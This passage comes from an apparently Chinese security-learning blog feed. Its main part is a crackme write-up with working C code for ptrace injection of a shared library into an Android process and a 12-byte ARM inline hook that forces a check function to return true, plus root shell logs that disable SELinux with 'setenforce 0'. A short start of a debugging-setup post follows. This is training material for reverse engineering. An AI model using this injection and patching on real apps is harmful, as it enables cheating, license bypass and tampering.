width="394"><p>在c标准函数调用时，前4个参数依次存放在R0~R3寄存器中，剩余的参数从右向左依次压入栈中，返回地址存放在LR寄存器中，返回值存放在R0寄存器中</p></blockquote><p>使用ptrace手动调用函数时，需要先使用PTRACE_GETREGS保存进程的寄存器信息，然后减小SP寄存器创建栈帧，将函数参数依次存放到R0~R3寄存器中，剩余参数存放到栈中，然后根据函数地址设置PC寄存器和CPSR寄存器，PC寄存器设置为函数地址，最低位置0，根据函数地址最低位设置CPSR寄存器Thumb模式标志为，然后设置LR寄存器为0,使函数返回时，触发错误停止</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// PC寄存器，低位决定处理器模式</span><br>regs.uregs[<span class="hljs-number">15</span>] = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)proc_addr &amp; <span class="hljs-number">0xFFFFFFFE</span>);<br><span class="hljs-comment">// PSR寄存器，第5位决定Thumb模式,根据函数地址最低位确定是否进入Thumb模式</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)proc_addr &amp; <span class="hljs-number">0x1</span>)<br>&#123;<br>    <span class="hljs-comment">// Thumb模式</span><br>    regs.uregs[<span class="hljs-number">16</span>] = regs.uregs[<span class="hljs-number">16</span>] | <span class="hljs-number">0x20</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-comment">// arm模式</span><br>    regs.uregs[<span class="hljs-number">16</span>] = regs.uregs[<span class="hljs-number">16</span>] &amp; <span class="hljs-number">0xFFFFFFDF</span>;<br>&#125;<br><span class="hljs-comment">// LR寄存器</span><br>regs.uregs[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>完成寄存器设置后，使用PTRACE_SETREGS将设置进程寄存器为修改后的寄存器，使用PTRACE_CONT恢复进程运行，waitpid等待进程触发返回异常,当进程触发返回异常断下是，waitpid返回状态码为<code>0xb7f</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (ptrace_setregs(pid, &amp;regs) != <span class="hljs-number">0</span> || ptrace_continue(pid) != <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call proc 0x%lx failed\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)proc_addr);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">// 等待函数执行完返回错误</span><br>waitpid(pid, &amp;status, WUNTRACED);<br><span class="hljs-comment">// printf(&quot;0x%x\n&quot;, status);</span><br><span class="hljs-keyword">while</span> (status != <span class="hljs-number">0xb7f</span>)<br>&#123;<br>    ptrace_continue(pid);<br>    waitpid(pid, &amp;status, WUNTRACED);<br>&#125;<br></code></pre></td></tr></table></figure><p>进程返回后，使用PTRACE_GETREGS获取寄存器，读取返回值R0寄存器，并使用调用函数前保存的寄存器恢复进程寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">ptrace_getregs(pid, &amp;regs);<br><span class="hljs-comment">// 返回值在R0中</span><br>ret = (<span class="hljs-type">void</span> *)regs.uregs[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 恢复寄存器</span><br>ptrace_setregs(pid, &amp;saved_regs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;proc 0x%lx return value: 0x%lx\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)proc_addr, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ret);<br><span class="hljs-keyword">return</span> ret;<br></code></pre></td></tr></table></figure><p>调用<code>malloc</code>函数和<code>dlopen</code>函数之前，需要获取函数在内存中的加载地址，读取<code>/proc/self/maps</code>文件可以得到<code>libc.so</code>和<code>libdl.so</code>加载的基地址，使用<code>dlopen</code>加载so文件，使用<code>dlsym</code>可以获得<code>malloc</code>和<code>dlopen</code>函数在注入器进程中的加载地址，与so文件基地址相减得到偏移地址，然后读取<code>/proc/pid/maps</code>文件可以获取待注入进程中<code>libc.so</code>和<code>libdl.so</code>加载基地址，根据偏移地址得到<code>malloc</code>和<code>dlopen</code>在待注入进程中的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取proc函数的内存地址</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">get_remote_proc_addr</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *lib_path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *proc_name)</span><br>&#123;<br>    <span class="hljs-type">void</span> *handle;<br>    <span class="hljs-type">void</span> *local_module_base;<br>    <span class="hljs-type">void</span> *local_proc_addr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> proc_offset;<br>    <span class="hljs-type">void</span> *remote_module_base;<br>    <span class="hljs-type">void</span> *remote_proc_addr;<br>    <span class="hljs-comment">// 在本地加载lib文件并获取proc函数偏移</span><br>    handle = dlopen(lib_path, RTLD_LAZY);<br>    <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open %s failed\n&quot;</span>, lib_path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    dlerror();<br>    local_module_base = get_module_base(<span class="hljs-number">0</span>, lib_path);<br>    local_proc_addr = dlsym(handle, proc_name);<br>    proc_offset = local_proc_addr - local_module_base;<br>    dlclose(handle);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s offset: 0x%lx\n&quot;</span>, proc_name, proc_offset);<br>    remote_module_base = get_module_base(pid, lib_path);<br>    remote_proc_addr = remote_module_base + proc_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s address: 0x%lx\n&quot;</span>, proc_name, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)remote_proc_addr);<br>    <span class="hljs-keyword">return</span> remote_proc_addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>注入器函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 注入so到进程</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inject_lib</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *lib_path)</span><br>&#123;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">void</span> *params[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">void</span> *proc_malloc;<br>    <span class="hljs-type">void</span> *proc_dlopen;<br>    <span class="hljs-type">void</span> *proc_dlerror;<br>    <span class="hljs-type">void</span> *mem_buf;<br>    proc_malloc = get_remote_proc_addr(pid, libc_path, <span class="hljs-string">&quot;malloc&quot;</span>);<br>    proc_dlopen = get_remote_proc_addr(pid, libdl_path, <span class="hljs-string">&quot;dlopen&quot;</span>);<br>    proc_dlerror = get_remote_proc_addr(pid, libdl_path, <span class="hljs-string">&quot;dlerror&quot;</span>);<br>    <span class="hljs-comment">// 首先附加到进程</span><br>    ptrace_attach(pid);<br>    <span class="hljs-comment">// 调用malloc分配内存写入lib文件路径</span><br>    params[<span class="hljs-number">0</span>] = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x100</span>;<br>    mem_buf = ptrace_call(pid, proc_malloc, <span class="hljs-number">1</span>, params);<br>    <span class="hljs-keyword">if</span> (mem_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc memory failed\n&quot;</span>);<br>        ptrace_continue(pid);<br>        ptrace_detach(pid);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc memory at 0x%lx\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)mem_buf);<br>    <span class="hljs-comment">// 将lib路径写入进程内存</span><br>    ptrace_write(pid, mem_buf, <span class="hljs-built_in">strlen</span>(lib_path) + <span class="hljs-number">1</span>, (<span class="hljs-type">void</span> *)lib_path);<br>    <span class="hljs-comment">// 调用dlopen将lib文件加载到进程</span><br>    params[<span class="hljs-number">0</span>] = mem_buf;<br>    params[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> *)RTLD_LAZY;<br>    <span class="hljs-keyword">if</span> (ptrace_call(pid, proc_dlopen, <span class="hljs-number">2</span>, params) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dlopen load %s to process %d failed\n&quot;</span>, lib_path, pid);<br>        <span class="hljs-comment">// 调用dlerror查看错误原因</span><br>        <span class="hljs-type">void</span> *err_addr = ptrace_call(pid, proc_dlerror, <span class="hljs-number">0</span>, params);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> err[<span class="hljs-number">0x100</span>];<br>        ptrace_read(pid, err_addr, <span class="hljs-number">0x100</span>, (<span class="hljs-type">void</span> *)err);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, err);<br>        ptrace_continue(pid);<br>        ptrace_detach(pid);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dlopen load %s to process %d succeed\n&quot;</span>, lib_path, pid);<br>    ptrace_continue(pid);<br>    ptrace_detach(pid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译注入器上传到手机进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ armv7a-linux-androideabi33-clang -o injector ptrace_injector.c<br>❯ adb push injector /data/local/tmp<br>injector: 1 file pushed, 0 skipped. 130.1 MB/s (11088 bytes in 0.000s)<br><br>❯ adb shell<br>lmipro:/ $ su<br>lmipro:/ # cd /data/local/tmp<br>lmipro:/data/local/tmp # ./injector com.example.crackme1 /data/local/tmp/libhook.so<br>pid of com.example.crackme1: 21551<br>/apex/com.android.runtime/lib/bionic/libc.so at 0xf6a52000<br>malloc offset: 0x2d685<br>/apex/com.android.runtime/lib/bionic/libc.so at 0xeac4f000<br>malloc address: 0xeac7c685<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xf6a0c000<br>dlopen offset: 0x1849<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xe9f92000<br>dlopen address: 0xe9f93849<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xf6a0c000<br>dlerror offset: 0x1853<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xe9f92000<br>dlerror address: 0xe9f93853<br>attach to process pid: 21551<br>proc 0xeac7c685 param 0 value: 0x100<br>proc 0xeac7c685 return value: 0x7b4e0700<br>malloc memory at 0x7b4e0700<br>write 0x1b bytes, start-addr: 0x7b4e0700<br>proc 0xe9f93849 param 0 value: 0x7b4e0700<br>proc 0xe9f93849 param 1 value: 0x1<br>proc 0xe9f93849 return value: 0x0<br>dlopen load /data/local/tmp/libhook.so to process 21551 failed<br>proc 0xe9f93853 return value: 0xec8f6514<br>read 0x100 bytes, start-addr: 0xec8f6514<br>dlopen failed: couldn&#x27;t map &quot;/data/local/tmp/libhook.so&quot; segment 2: Permission denied<br></code></pre></td></tr></table></figure><p>根据打印信息，注入器在待注入进程中调用<code>malloc</code>方法成功分配了内存，但是调用<code>dlopen</code>返回值为<code>NULL</code>，加载so文件失败，调用<code>dlerror</code>查看到返回错误消息为<code>dlopen failed: couldn&#39;t map &quot;/data/local/tmp/libhook.so&quot; segment 2: Permission denied</code>，说明so路径写入正确，进一步尝试发现，该错误与SELinux有关，开启SELinux模式后，进程无法加载非系统lib目录下的so文件，关闭SELinux后进行注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">lmipro:/data/local/tmp # getenforce                                                                                                                       <br>Enforcing<br>lmipro:/data/local/tmp # setenforce 0                                                                                                                     <br>lmipro:/data/local/tmp # getenforce                                                                                                                       <br>Permissive<br>lmipro:/data/local/tmp # ./injector com.example.crackme1 /data/local/tmp/libhook.so                                                                       <br>pid of com.example.crackme1: 21551<br>/apex/com.android.runtime/lib/bionic/libc.so at 0xf274d000<br>malloc offset: 0x2d685<br>/apex/com.android.runtime/lib/bionic/libc.so at 0xeac4f000<br>malloc address: 0xeac7c685<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xf270c000<br>dlopen offset: 0x1849<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xe9f92000<br>dlopen address: 0xe9f93849<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xf270c000<br>dlerror offset: 0x1853<br>/apex/com.android.runtime/lib/bionic/libdl.so at 0xe9f92000<br>dlerror address: 0xe9f93853<br>attach to process pid: 21551<br>proc 0xeac7c685 param 0 value: 0x100<br>proc 0xeac7c685 return value: 0x7b4e0800<br>malloc memory at 0x7b4e0800<br>write 0x1b bytes, start-addr: 0x7b4e0800<br>proc 0xe9f93849 param 0 value: 0x7b4e0800<br>proc 0xe9f93849 param 1 value: 0x1<br>proc 0xe9f93849 return value: 0x5fe6de0b<br>dlopen load /data/local/tmp/libhook.so to process 21551 succeed<br></code></pre></td></tr></table></figure><p>注入成功，查看<code>/proc/pid/maps</code>中模块加载信息</p><p><img src="2023-10-09-13-32-08-image.png"></p><p>libhook.so成功加载到进程内存</p><h3 id="4-inline-hook"><a href="#4-inline-hook" class="headerlink" title="4.inline hook"></a>4.inline hook</h3><p>根据提示，选择hook的函数为<code>proc</code>，偏移地址<code>0x1134</code>，此处选择使用inline hook的方式实现</p><p>首先在<code>libhook.c</code>文件中定义替代<code>proc</code>的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">hookProc</span><span class="hljs-params">()</span><br>&#123;<br>    LOGD(<span class="hljs-string">&quot;hook and return TRUE&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数打印log信息并返回1，使<code>stringFromJNI</code>函数返回<code>right</code></p><p>跳转到该函数使用如下汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm6502">LDR R0, [PC+8]<br>MOV PC, R0<br>hookProc_addr<br></code></pre></td></tr></table></figure><p>跳转码共12个字节，将<code>hookProc</code>的地址先加载到R0寄存器，使用MOV指令修改PC寄存器到<code>hookProc</code>函数，由于<code>hookProc</code>函数的作用是代替<code>proc</code>执行，参数、返回值、返回地址均不需要额外处理</p><p>修改<code>libcrackme1.so</code>加载处内存的保护权限，将12个字节跳转码写入<code>proc</code>函数起始处，完成hook操作</p><p>so文件注入后的自动执行可以使用<code>__attribute__((constructor))</code>属性声明函数，该属性声明的函数会在dlopen函数返回前执行</p><p>设置hook的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sethook</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 首先获取libcrackme1.so加载的基地址</span><br>    <span class="hljs-type">void</span> *lib_base = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> proc_offset = <span class="hljs-number">0x1134</span>;<br>    <span class="hljs-type">void</span> *proc_addr;<br>    FILE *fp;<br>    <span class="hljs-type">char</span> line[<span class="hljs-number">0x100</span>];<br>    fp = fopen(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>);<br>    fgets(line, <span class="hljs-number">0x100</span>, fp);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">strlen</span>(line) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;libcrackme1.so&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%lx&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)&amp;lib_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        fgets(line, <span class="hljs-number">0x100</span>, fp);<br>    &#125;<br>    fclose(fp);<br>    <span class="hljs-keyword">if</span> (lib_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        LOGD(<span class="hljs-string">&quot;get libcrackme1.so base failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    LOGD(<span class="hljs-string">&quot;libcrackme1.so at 0x%lx&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)lib_base);<br>    proc_addr = (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)lib_base + proc_offset);<br>    LOGD(<span class="hljs-string">&quot;hook proc at 0x%lx&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)proc_addr);<br>    LOGD(<span class="hljs-string">&quot;new proc at 0x%lx&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)hookProc);<br>    <span class="hljs-comment">// LDR R0, [PC+8]</span><br>    <span class="hljs-comment">// MOV PC, R0</span><br>    <span class="hljs-comment">// hookProc</span><br>    <span class="hljs-comment">// 修改段保护</span><br>    <span class="hljs-keyword">if</span> (mprotect(lib_base, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC) != <span class="hljs-number">0</span>)<br>    &#123;<br>        LOGD(<span class="hljs-string">&quot;mprotect failed&quot;</span>);<br>        perror(<span class="hljs-string">&quot;mprotect&quot;</span>);<br>        LOGD(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, strerror(errno));<br>    &#125;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> jumpCode[<span class="hljs-number">0xc</span>] = &#123;<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE1</span>&#125;;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(jumpCode + <span class="hljs-number">8</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)hookProc;<br>    __memcpy(proc_addr, (<span class="hljs-type">void</span> *)jumpCode, <span class="hljs-number">0xc</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>设置log和so入口函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">onload</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><br><span class="hljs-type">void</span> (*__android_log_print)(<span class="hljs-type">int</span> i, ...);<br><span class="hljs-type">void</span> *handle;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TAG <span class="hljs-string">&quot;Crack&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOGD(...) __android_log_print(3, TAG, __VA_ARGS__)  </span><br><span class="hljs-type">void</span> *(*__memcpy)(<span class="hljs-type">void</span> *dst, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> n);<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">onload</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 设置LOGD</span><br>    handle = dlopen(<span class="hljs-string">&quot;/system/lib/liblog.so&quot;</span>, RTLD_LAZY);<br>    __android_log_print = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">int</span>, ...))dlsym(handle, <span class="hljs-string">&quot;__android_log_print&quot;</span>);<br>    dlclose(handle);<br>    <span class="hljs-comment">// 获取memcpy</span><br>    handle = dlopen(<span class="hljs-string">&quot;/apex/com.android.runtime/lib/bionic/libc.so&quot;</span>, RTLD_LAZY);<br>    __memcpy = (<span class="hljs-type">void</span> *(*)(<span class="hljs-type">void</span> *, <span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>))dlsym(handle, <span class="hljs-string">&quot;memcpy&quot;</span>);<br>    dlclose(handle);<br><br>    LOGD(<span class="hljs-string">&quot;injected by noxke&quot;</span>);<br>    sethook();<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的<code>__android_log_print</code>和<code>memcpy</code>需要使用<code>dlopen</code>和<code>dlsym</code>获取</p><p>编译hook代码，上传并注入到<code>com.example.crackme1</code>进程中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">armv7a-linux-androideabi33-clang libhook.c -shared -fPIC -o libhook.so<br>❯ adb push libhook.so /data/local/tmp/<br>libhook.so: 1 file pushed, 0 skipped. 106.0 MB/s (7180 bytes in 0.000s)<br><br>❯ adb shell<br>lmipro:/ $ cd /data/local/tmp<br>lmipro:/data/local/tmp $ su<br>lmipro:/data/local/tmp # ./injector com.example.crackme1 /data/local/tmp/libhook.so<br></code></pre></td></tr></table></figure><p>使用logcat查看log信息</p><p><img src="2023-10-09-13-46-53-image.png"></p><p>随意输入字符串，点击确定按钮</p><img src="2023-10-09-13-47-45-image.png" title="" alt="" width="216"><p>logcat打印日志</p><p><img src="2023-10-09-13-48-34-image.png"></p><p>hook结果与所需结果相同，<code>proc</code>代码的调用会被跳转到<code>hookProc</code>执行并返回，<code>stringFromJNI</code>返回<code>right</code>字符串</p><p>使用ida查看修改后的<code>proc</code>函数和<code>hookProc</code>函数</p><img src="2023-10-09-13-51-27-image.png" title="" alt="" width="492"><img src="2023-10-09-13-52-02-image.png" title="" alt="" width="489">]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>移动端调试环境搭建</title>
    <link href="/2023/10/02/TencentGameClient/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/10/02/TencentGameClient/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>本篇将介绍安卓软件Java层和Native层调试工具的安装和简单使用</p><p>涉及到的软件如下</p><p><a href="https://developer.android.google.cn/studio?hl=zh-cn">Android studio</a></p><p><a href="https://github.com/skylot/jadx">jadx</a></p><p><a href="https://hex-rays.com/IDA-pro/">Ida Pro</a></p><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><blockquote><p>jadx和Ida的安装使用都很简单，此处不做介绍，安装Android studio过程需要确保有正常的网络环境，网络配置不做介绍</p></blockquote><ol><li><p>插件安装</p><p><a href="https://plugins.jetbrains.com/plugin/13710-chinese-simplified-language-pack----/versions#tabs">Chinese (Simplified) Language Pack &#x2F; 中文语言包 - IntelliJ IDEs Plugin | Marketplace</a></p><p><a href="https://github.com/JesusFreke/smalidea">GitHub - JesusFreke&#x2F;smalidea: smalidea is a smali language plugin for IntelliJ IDEA</a></p></li><li><p>SDK安装</p><p>打开SDK Manager，修改sdk目录，安装如下SDK工具</p><p><img 